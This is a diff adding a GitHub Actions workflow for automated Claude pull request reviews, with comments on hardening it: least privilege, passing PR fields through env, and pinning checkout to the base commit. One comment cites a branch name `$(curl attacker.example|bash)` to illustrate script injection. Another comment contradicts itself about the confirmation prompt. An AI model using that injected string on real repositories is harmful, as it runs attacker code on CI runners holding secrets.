@@ -1,0 +1,106 @@
+name: Automated PR Review
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+# Least privilege: only what fetching a PR and posting a review actually needs.
+permissions:
+  pull-requests: write
+  contents: read
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+
+    # Infinite-loop prevention. Note this is a defensive extra, not the primary safeguard: posting
+    # a PR review or comment does NOT itself produce a new commit, and does not open/reopen the
+    # PR - so it can never generate a new pull_request:[opened|synchronize|reopened] event in the
+    # first place. This workflow structurally cannot re-trigger itself from its own output. This
+    # condition only guards the one scenario that WOULD matter if this ever changes (e.g. the bot
+    # is extended to open PRs itself, or someone widens the trigger's event types): skip if the PR
+    # was authored by, or this specific event was caused by, the bot's own account. The default
+    # GITHUB_TOKEN's actor is always "github-actions[bot]" - change both logins below if you
+    # configure a custom bot account/PAT for GITHUB_TOKEN instead.
+    if: >
+      github.event.pull_request.user.login != 'github-actions[bot]' &&
+      github.actor != 'github-actions[bot]'
+
+    steps:
+      # Requirement: identify repository / PR number / commit SHA / source branch / target
+      # branch. All five come from the pull_request event payload and are logged here for
+      # traceability. They're passed through `env:` and read as shell variables ($VAR) rather
+      # than interpolated directly into the script via `${{ }}` - PR-controlled fields like the
+      # source branch name are attacker input, and substituting them directly into a `run:`
+      # script is a well-known GitHub Actions script-injection vector (a branch named e.g.
+      # `$(curl attacker.example|bash)` would otherwise be spliced into the script as literal
+      # shell syntax and executed, not just printed).
+      - name: Identify the pull request
+        env:
+          PR_REPOSITORY: ${{ github.repository }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_COMMIT_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_SOURCE_BRANCH: ${{ github.event.pull_request.head.ref }}
+          PR_TARGET_BRANCH: ${{ github.event.pull_request.base.ref }}
+        run: |
+          echo "Repository:     $PR_REPOSITORY"
+          echo "PR number:      $PR_NUMBER"
+          echo "Commit SHA:     $PR_COMMIT_SHA"
+          echo "Source branch:  $PR_SOURCE_BRANCH"
+          echo "Target branch:  $PR_TARGET_BRANCH"
+
+      # Deliberately pinned to the PR's BASE commit - i.e. this repo's own trusted history -
+      # rather than the PR's head or GitHub's default merge ref for this event. This is the
+      # single most important line in this workflow: without it, `npm ci` and the review step
+      # below would install and RUN the pull request's own (possibly attacker-modified, possibly
+      # from an untrusted fork) source code while ANTHROPIC_API_KEY and GITHUB_TOKEN are present
+      # in the environment - a one-line change to src/cli/autoReview.ts in a malicious fork PR
+      # would be enough to exfiltrate both secrets to an external server the moment this workflow
+      # runs. Since this tool only ever reads the PR's diff over the GitHub API (see
+      # github/prService.ts) - it never needs the PR's own files checked out locally at all -
+      # pinning to the base commit costs nothing functionally and closes that off completely.
+      - name: Checkout pr-review-agent (pinned to the trusted base commit, not the PR's own code)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}
+
+      - name: Set up Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22.x
+          cache: npm
+
+      - name: Install dependencies
+        run: npm ci
+
+      # Runs the automated (non-interactive) review engine: fetches the PR via the same GitHub
+      # service layer the MCP tools expose (github/prService.ts - see the README's "GitHub tools"
+      # section for why this workflow calls that layer directly rather than round-tripping
+      # through the MCP stdio protocol inside a single CI step), sends the diff to Claude, and
+      # posts a review automatically - no confirmation prompt, since confirmBeforePosting is left
+      # at its default (always true) in src/cli/autoReview.ts.
+      #
+      # Secrets: GITHUB_TOKEN is the Actions-generated ephemeral token (scoped by `permissions:`
+      # above, never a repo secret you configure) and ANTHROPIC_API_KEY is a real secret you set
+      # under Settings -> Secrets and variables -> Actions. Neither is ever echoed - GitHub Actions
+      # automatically masks any log output matching a configured secret's value, and this
+      # project's own logging (toSafeLogFields(), see src/workflow/logger.ts) never reads a raw
+      # error's request/response internals in the first place, so a token can't leak through an
+      # error message either. Just as importantly, both secrets are only ever in scope while
+      # running the CHECKED-OUT-AT-BASE code above, never the PR's own - see the checkout step.
+      #
+      # Note for PRs from forks: GitHub automatically downgrades the default GITHUB_TOKEN to
+      # read-only for pull_request runs triggered by a fork, regardless of the `permissions:`
+      # block above - this is a GitHub platform protection, not something this workflow can or
+      # should override. The practical effect is that create_pull_request_review will fail with a
+      # 403 on fork PRs unless you explicitly configure repository/environment settings to allow
+      # write access for fork PRs; the failure is safe (autoReview.ts logs it via
+      # toSafeLogFields() and exits non-zero) and posts nothing.
+      - name: Run the automated Claude review
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          PR_OWNER: ${{ github.repository_owner }}
+          PR_REPO: ${{ github.event.repository.name }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: npx tsx src/cli/autoReview.ts --owner="$PR_OWNER" --repo="$PR_REPO" --pr="$PR_NUMBER"
